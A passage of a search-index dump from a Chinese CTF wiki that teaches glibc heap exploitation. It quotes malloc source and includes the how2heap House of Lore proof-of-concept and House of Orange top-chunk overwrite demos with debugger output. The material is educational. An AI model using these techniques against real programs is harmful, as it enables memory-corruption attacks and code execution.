Lore"},{"location":"pwn/heap/house_of_lore/#_1","text":"House of Lore \u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Small Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002 House of Lore \u53ef\u4ee5\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u4f4d\u7f6e\u7684 chunk\uff0c\u4ece\u800c\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002 House of Lore \u5229\u7528\u7684\u524d\u63d0\u662f\u9700\u8981\u63a7\u5236 Small Bin Chunk \u7684 bk \u6307\u9488\uff0c\u5e76\u4e14\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e chunk \u7684 fd \u6307\u9488\u3002","title":"\u6982\u8ff0"},{"location":"pwn/heap/house_of_lore/#_2","text":"\u5982\u679c\u5728 malloc \u7684\u65f6\u5019\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5728 small bin \u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } \u4ece\u4e0b\u9762\u7684\u8fd9\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u770b\u51fa // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck->fd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"pwn/heap/house_of_lore/#_3","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot (){ puts ( \"Nice jump d00d\" ); exit ( 0 ); } int main ( int argc , char * argv []){ intptr_t * stack_buffer_1 [ 4 ] = { 0 }; intptr_t * stack_buffer_2 [ 3 ] = { 0 }; fprintf ( stderr , \" \\n Welcome to the House of Lore \\n \" ); fprintf ( stderr , \"This is a revisited version that bypass also the hardening check introduced by glibc malloc \\n \" ); fprintf ( stderr , \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23 \\n\\n \" ); fprintf ( stderr , \"Allocating the victim chunk \\n \" ); intptr_t * victim = malloc ( 100 ); fprintf ( stderr , \"Allocated the first small chunk on the heap at %p \\n \" , victim ); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t * victim_chunk = victim - 2 ; fprintf ( stderr , \"stack_buffer_1 at %p \\n \" , ( void * ) stack_buffer_1 ); fprintf ( stderr , \"stack_buffer_2 at %p \\n \" , ( void * ) stack_buffer_2 ); fprintf ( stderr , \"Create a fake chunk on the stack\" ); fprintf ( stderr , \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\" \"in second to the last malloc, which putting stack address on smallbin list \\n \" ); stack_buffer_1 [ 0 ] = 0 ; stack_buffer_1 [ 1 ] = 0 ; stack_buffer_1 [ 2 ] = victim_chunk ; fprintf ( stderr , \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \" \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \" \"chunk on stack\" ); stack_buffer_1 [ 3 ] = ( intptr_t * ) stack_buffer_2 ; stack_buffer_2 [ 2 ] = ( intptr_t * ) stack_buffer_1 ; fprintf ( stderr , \"Allocating another large chunk in order to avoid consolidating the top chunk with\" \"the small one during the free() \\n \" ); void * p5 = malloc ( 1000 ); fprintf ( stderr , \"Allocated the large chunk on the heap at %p \\n \" , p5 ); fprintf ( stderr , \"Freeing the chunk %p, it will be inserted in the unsorted bin \\n \" , victim ); free (( void * ) victim ); fprintf ( stderr , \" \\n In the unsorted bin the victim's fwd and bk pointers are nil \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); fprintf ( stderr , \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin \\n \" ); fprintf ( stderr , \"This means that the chunk %p will be inserted in front of the SmallBin \\n \" , victim ); void * p2 = malloc ( 1200 ); fprintf ( stderr , \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p \\n \" , p2 ); fprintf ( stderr , \"The victim chunk has been sorted and its fwd and bk pointers updated \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); //------------VULNERABILITY----------- fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the victim->bk pointer \\n \" ); victim [ 1 ] = ( intptr_t ) stack_buffer_1 ; // victim->bk is pointing to stack //------------------------------------ fprintf ( stderr , \"Now allocating a chunk with size equal to the first one freed \\n \" ); fprintf ( stderr , \"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer \\n \" ); void * p3 = malloc ( 100 ); fprintf ( stderr , \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk \\n \" ); char * p4 = malloc ( 100 ); fprintf ( stderr , \"p4 = malloc(100) \\n \" ); fprintf ( stderr , \" \\n The fwd pointer of stack_buffer_2 has changed after the last malloc to %p \\n \" , stack_buffer_2 [ 2 ]); fprintf ( stderr , \" \\n p4 is %p and should be on the stack! \\n \" , p4 ); // this chunk will be allocated on stack intptr_t sc = ( intptr_t ) jackpot ; // Emulating our in-memory shellcode memcpy (( p4 + 40 ), & sc , 8 ); // This bypasses stack-smash detection since it jumps over the canary } \u4e0a\u9762\u4ee3\u7801\u5df2\u7ecf\u8bb2\u5f97\u975e\u5e38\u6e05\u695a\u4e86\uff0c\u4e0d\u518d\u89e3\u91ca\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a void *p5 = malloc(1000); \u662f\u4e3a\u4e86\u9632\u6b62\u548c victim_chunk \u4e4b\u540e\u548c top_chunk\u5408\u5e76\u3002 free((void*)victim) \uff0cvictim \u4f1a\u88ab\u653e\u5165\u5230 unsort bin \u4e2d\u53bb\uff0c\u7136\u540e\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u5927\u5c0f\u5982\u679c\u6bd4\u5b83\u5927\uff0c\u90a3\u4e48\u5c06\u4ece top chunk \u4e0a\u5206\u914d\u76f8\u5e94\u5927\u5c0f\uff0c\u800c\u8be5 chunk \u4f1a\u88ab\u53d6\u4e0blink\u5230\u76f8\u5e94\u7684 bin \u4e2d\u3002\u5982\u679c\u6bd4\u5b83\u5c0f(\u76f8\u7b49\u5219\u76f4\u63a5\u8fd4\u56de)\uff0c\u5219\u4ece\u8be5 chunk \u4e0a\u5207\u9664\u76f8\u5e94\u5927\u5c0f\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94 chunk\uff0c\u5269\u4e0b\u7684\u6210\u4e3a last reminder chunk ,\u8fd8\u662f\u5b58\u5728 unsorted bin \u4e2d\u3002","title":"\u793a\u4f8b\u4ee3\u7801"},{"location":"pwn/heap/house_of_lore/#_4","text":"https://github.com/shellphish/how2heap/blob/master/house_of_lore.c","title":"\u53c2\u8003\u6587\u732e"},{"location":"pwn/heap/house_of_orange/","text":"House of Orange \u00b6 \u4ecb\u7ecd \u00b6 House of Orange\u4e0e\u5176\u4ed6\u7684House of XX\u5229\u7528\u65b9\u6cd5\u4e0d\u540c\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u6765\u81ea\u4e8eHitcon CTF 2016\u4e2d\u7684\u4e00\u9053\u540c\u540d\u9898\u76ee\u3002\u7531\u4e8e\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5728\u6b64\u524d\u7684CTF\u9898\u76ee\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\uff0c\u56e0\u6b64\u4e4b\u540e\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u884d\u751f\u9898\u76ee\u7684\u5229\u7528\u65b9\u6cd5\u6211\u4eec\u79f0\u4e4b\u4e3aHouse of Orange\u3002 \u6982\u8ff0 \u00b6 House of Orange\u7684\u5229\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u9996\u5148\u9700\u8981\u76ee\u6807\u6f0f\u6d1e\u662f\u5806\u4e0a\u7684\u6f0f\u6d1e\u4f46\u662f\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u9898\u76ee\u4e2d\u4e0d\u5b58\u5728free\u51fd\u6570\u6216\u5176\u4ed6\u91ca\u653e\u5806\u5757\u7684\u51fd\u6570\u3002\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60f3\u8981\u5229\u7528\u5806\u6f0f\u6d1e\uff0c\u9700\u8981\u5bf9\u5806\u5757\u8fdb\u884cmalloc\u548cfree\u64cd\u4f5c\uff0c\u4f46\u662f\u5728House of Orange\u5229\u7528\u4e2d\u65e0\u6cd5\u4f7f\u7528free\u51fd\u6570\uff0c\u56e0\u6b64House of Orange\u6838\u5fc3\u5c31\u662f\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u5f97free\u7684\u6548\u679c\u3002 \u539f\u7406 \u00b6 \u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\uff0cHouse of Orange\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u6ca1\u6709free\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u4e00\u4e2a\u91ca\u653e\u7684\u5806\u5757(unsorted bin)\u3002 \u8fd9\u79cd\u64cd\u4f5c\u7684\u539f\u7406\u7b80\u5355\u6765\u8bf4\u662f\u5f53\u524d\u5806\u7684top chunk\u5c3a\u5bf8\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u539f\u6765\u7684top chunk\u4f1a\u88ab\u91ca\u653e\u5e76\u88ab\u7f6e\u5165unsorted bin\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5728\u6ca1\u6709free\u51fd\u6570\u60c5\u51b5\u4e0b\u83b7\u53d6\u5230unsorted bins\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u524d\u7684top chunk\u5df2\u7ecf\u4e0d\u6ee1\u8db3malloc\u7684\u5206\u914d\u9700\u6c42\u3002 \u9996\u5148\u6211\u4eec\u5728\u7a0b\u5e8f\u4e2d\u7684 malloc \u8c03\u7528\u4f1a\u6267\u884c\u5230libc.so\u7684 _int_malloc \u51fd\u6570\u4e2d\uff0c\u5728 _int_malloc \u51fd\u6570\u4e2d\uff0c\u4f1a\u4f9d\u6b21\u68c0\u9a8cfastbin\u3001small bins\u3001unsorted bin\u3001large bins\u662f\u5426\u53ef\u4ee5\u6ee1\u8db3\u5206\u914d\u8981\u6c42\uff0c\u56e0\u4e3a\u5c3a\u5bf8\u95ee\u9898\u8fd9\u4e9b\u90fd\u4e0d\u7b26\u5408\u3002\u63a5\u4e0b\u6765 _int_malloc \u51fd\u6570\u4f1a\u8bd5\u56fe\u4f7f\u7528top chunk\uff0c\u5728\u8fd9\u91cctop chunk\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u7684\u8981\u6c42\uff0c\u56e0\u6b64\u4f1a\u6267\u884c\u5982\u4e0b\u5206\u652f\u3002 /* Otherwise, relay to handle system-dependent cases */ else { void *p = sysmalloc(nb, av); if (p != NULL && __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p; } \u6b64\u65f6ptmalloc\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7533\u8bf7\u5806\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u6267\u884csysmalloc\u6765\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u7a7a\u95f4\u3002 \u4f46\u662f\u5bf9\u4e8e\u5806\u6765\u8bf4\u6709mmap\u548cbrk\u4e24\u79cd\u5206\u914d\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u5806\u4ee5brk\u7684\u5f62\u5f0f\u62d3\u5c55\uff0c\u4e4b\u540e\u539f\u6709\u7684top chunk\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u4e2d\u3002 \u7efc\u4e0a\uff0c\u6211\u4eec\u8981\u5b9e\u73b0brk\u62d3\u5c55top chunk\uff0c\u4f46\u662f\u8981\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9blibc\u4e2d\u7684check\u3002 \u9996\u5148\uff0cmalloc\u7684\u5c3a\u5bf8\u4e0d\u80fd\u5927\u4e8e mmp_.mmap_threshold if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max)) \u5982\u679c\u6240\u9700\u5206\u914d\u7684 chunk \u5927\u5c0f\u5927\u4e8e mmap \u5206\u914d\u9608\u503c\uff0c\u9ed8\u8ba4\u4e3a 128K\uff0c\u5e76\u4e14\u5f53\u524d\u8fdb\u7a0b\u4f7f\u7528 mmap()\u5206\u914d\u7684\u5185\u5b58\u5757\u5c0f\u4e8e\u8bbe\u5b9a\u7684\u6700\u5927\u503c\uff0c\u5c06\u4f7f\u7528 mmap()\u7cfb\u7edf\u8c03\u7528\u76f4\u63a5\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002 \u5728sysmalloc\u51fd\u6570\u4e2d\u5b58\u5728\u5bf9top chunk size\u7684check\uff0c\u5982\u4e0b assert((old_top == initial_top(av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse(old_top) && ((unsigned long)old_end & pagemask) == 0)); \u8fd9\u91cc\u68c0\u67e5\u4e86top chunk\u7684\u5408\u6cd5\u6027\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8c03\u7528\u672c\u51fd\u6570\uff0ctop chunk\u53ef\u80fd\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u53ef\u80fdold_size\u4e3a0\u3002 \u5982\u679ctop chunk\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u90a3\u4e48top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u5927\u4e8e\u7b49\u4e8eMINSIZE\uff0c\u56e0\u4e3atop chunk\u4e2d\u5305\u542b\u4e86 fencepost\uff0c\u6240\u4ee5top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u8981\u5927\u4e8eMINSIZE\u3002\u5176\u6b21Top chunk\u5fc5\u987b\u6807\u8bc6\u524d\u4e00\u4e2achunk\u5904\u4e8einuse\u72b6\u6001\uff0c\u5e76\u4e14top chunk\u7684\u7ed3\u675f\u5730\u5740\u5fc5\u5b9a\u662f\u9875\u5bf9\u9f50\u7684\u3002\u6b64\u5916top chunk\u9664\u53bbfencepost\u7684\u5927\u5c0f\u5fc5\u5b9a\u8981\u5c0f\u4e8e\u6240\u9700chunk\u7684\u5927\u5c0f\uff0c\u5426\u5219\u5728_int_malloc()\u51fd\u6570\u4e2d\u4f1a\u4f7f\u7528top chunk\u5206\u5272\u51fachunk\u3002 \u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4f2a\u9020\u7684top chunk size\u7684\u8981\u6c42 1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875 2.size\u8981\u5927\u4e8eMINSIZE(0x10) 3.size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size + MINSIZE(0x10) 4.size\u7684prev inuse\u4f4d\u5fc5\u987b\u4e3a1 \u4e4b\u540e\u539f\u6709\u7684top chunk\u5c31\u4f1a\u6267\u884c _int_free \u4ece\u800c\u987a\u5229\u8fdb\u5165unsorted bin\u4e2d\u3002 \u793a\u4f8b \u00b6 \u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e00\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u6a21\u62df\u4e86\u4e00\u4e2a\u6ea2\u51fa\u8986\u76d6\u5230top chunk\u7684size\u57df\u3002\u6211\u4eec\u8bd5\u56fe\u628asize\u6539\u5c0f\u4ece\u800c\u5b9e\u73b0brk\u6269\u5c55\uff0c\u5e76\u628a\u539f\u6709\u7684top chunk\u653e\u5165unsorted bin\u4e2d\u3002 #define fake_size 0x41 int main(void) { void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60); } \u8fd9\u91cc\u6211\u4eec\u628atop chunk\u7684size\u8986\u76d6\u4e3a0x41\u3002\u4e4b\u540e\u7533\u8bf7\u5927\u4e8e\u8fd9\u4e2a\u5c3a\u5bf8\u7684\u5806\u5757\uff0c\u53730x60\u3002 \u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c\u8fd9\u4e2a\u793a\u4f8b\u65f6\u4f1a\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\uff0c\u539f\u56e0\u5728\u4e8eassert\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u4ece\u800c\u629b\u51fa\u4e86\u5f02\u5e38\u3002 [#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6) [#1] 0x7ffff7a4402a \u2192 Name: __GI_abort() [#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 <__func__.11509> \"sysmalloc\") [#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 <main_arena>) \u6b63\u786e\u7684\u793a\u4f8b \u00b6 \u6211\u4eec\u56de\u5934\u6765\u770b\u4e00\u4e0bassert\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u5217\u51fa\u7684\u6761\u76ee\u90fd\u88ab\u6ee1\u8db3\u4e86\u9664\u4e86\u7b2c\u4e00\u6761\u3002 1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875 \u4ec0\u4e48\u662f\u5bf9\u9f50\u5230\u5185\u5b58\u9875\u5462\uff1f\u6211\u4eec\u77e5\u9053\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u4ee5\u5185\u5b58\u9875\u4e3a\u5355\u4f4d\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u4e00\u822c\u5185\u5b58\u9875\u7684\u5927\u5c0f\u662f4kb\u3002\u90a3\u4e48\u6211\u4eec\u4f2a\u9020\u7684size\u5c31\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u8fd9\u4e2a\u5c3a\u5bf8\u3002\u5728\u8986\u76d6\u4e4b\u524dtop chunk\u7684size\u5927\u5c0f\u662f20fe1\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u77e50x602020+0x20fe0=0x623000\u662f\u5bf9\u4e8e0x1000\uff084kb\uff09\u5bf9\u9f50\u7684\u3002 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 \u56e0\u6b64\u6211\u4eec\u4f2a\u9020\u7684fake_size\u53ef\u4ee5\u662f0x0fe1\u30010x1fe1\u30010x2fe1\u30010x3fe1\u7b49\u5bf94kb\u5bf9\u9f50\u7684size\u3002\u800c0x40\u4e0d\u6ee1\u8db3\u5bf9\u9f50\uff0c\u56e0\u6b64\u4e0d\u80fd\u5b9e\u73b0\u5229\u7528\u3002 #define fake_size 0x1fe1 int main(void) { void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60); } \u8fdb\u884c\u5206\u914d\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230\u539f\u6765\u7684\u5806\u7ecf\u8fc7\u4e86brk\u6269\u5c55 //\u539f\u6709\u7684\u5806 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] //\u7ecf\u8fc7\u6269\u5c55\u7684\u5806 0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap] \u6211\u4eec\u7684\u7533\u8bf7\u88ab\u5206\u914d\u52300x623010\u7684\u4f4d\u7f6e\uff0c\u540c\u65f6\u539f\u6709\u7684\u5806\u88ab\u7f6e\u5165unsorted bin [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 \u2192 Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE) \u56e0\u4e3aunsorted bin\u4e2d\u5b58\u5728\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u4e0b\u6b21\u7684\u5206\u914d\u4f1a\u5207\u5272\u8fd9\u4e2a\u5757 malloc(0x60); 0x602030 [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE) \u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u5185\u5b58\u662f\u4eceunsorted bin\u4e2d\u5207\u5272\u7684\uff0c\u5185\u5b58\u5e03\u5c40\u5982\u4e0b 0x602030: 0x00007ffff7dd2208 0x00007ffff7dd2208 <== \u672a\u88ab\u6e05\u96f6\u7684unsorted bin\u94fe\u8868 0x602040: 0x0000000000602020 0x0000000000602020 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000001f51 <== \u5207\u5272\u5269\u4e0b\u7684\u65b0unsorted bin 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x0000000000000000 0x0000000000000000 \u5176\u5b9ehouse of orange\u7684\u8981\u70b9\u6b63\u5728\u4e8e\u6b64\uff0c\u4e4b\u540e\u7684\u5229\u7528\u56e0\u4e3a\u6d89\u53ca\u5230_IO_FILE\u7684\u77e5\u8bc6\uff0c\u653e\u5230IO_FILE\u72ec\u7acb\u7ae0\u8282\u5206\u4eab\u3002","title":"House of Orange"},{"location":"pwn/heap/house_of_orange/#house-of-orange","text":"","title":"House of Orange"},{"location":"pwn/heap/house_of_orange/#_1","text":"House of Orange\u4e0e\u5176\u4ed6\u7684House of XX\u5229\u7528\u65b9\u6cd5\u4e0d\u540c\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u6765\u81ea\u4e8eHitcon CTF 2016\u4e2d\u7684\u4e00\u9053\u540c\u540d\u9898\u76ee\u3002\u7531\u4e8e\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5728\u6b64\u524d\u7684CTF\u9898\u76ee\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\uff0c\u56e0\u6b64\u4e4b\u540e\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u884d\u751f\u9898\u76ee\u7684\u5229\u7528\u65b9\u6cd5\u6211\u4eec\u79f0\u4e4b\u4e3aHouse of Orange\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/house_of_orange/#_2","text":"House of Orange\u7684\u5229\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u9996\u5148\u9700\u8981\u76ee\u6807\u6f0f\u6d1e\u662f\u5806\u4e0a\u7684\u6f0f\u6d1e\u4f46\u662f\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u9898\u76ee\u4e2d\u4e0d\u5b58\u5728free\u51fd\u6570\u6216\u5176\u4ed6\u91ca\u653e\u5806\u5757\u7684\u51fd\u6570\u3002\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60f3\u8981\u5229\u7528\u5806\u6f0f\u6d1e\uff0c\u9700\u8981\u5bf9\u5806\u5757\u8fdb\u884cmalloc\u548cfree\u64cd\u4f5c\uff0c\u4f46\u662f\u5728House of Orange\u5229\u7528\u4e2d\u65e0\u6cd5\u4f7f\u7528free\u51fd\u6570\uff0c\u56e0\u6b64House of Orange\u6838\u5fc3\u5c31\u662f\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u5f97free\u7684\u6548\u679c\u3002","title":"\u6982\u8ff0"},{"location":"pwn/heap/house_of_orange/#_3","text":"\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\uff0cHouse of Orange\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u6ca1\u6709free\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u4e00\u4e2a\u91ca\u653e\u7684\u5806\u5757(unsorted bin)\u3002 \u8fd9\u79cd\u64cd\u4f5c\u7684\u539f\u7406\u7b80\u5355\u6765\u8bf4\u662f\u5f53\u524d\u5806\u7684top chunk\u5c3a\u5bf8\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u539f\u6765\u7684top 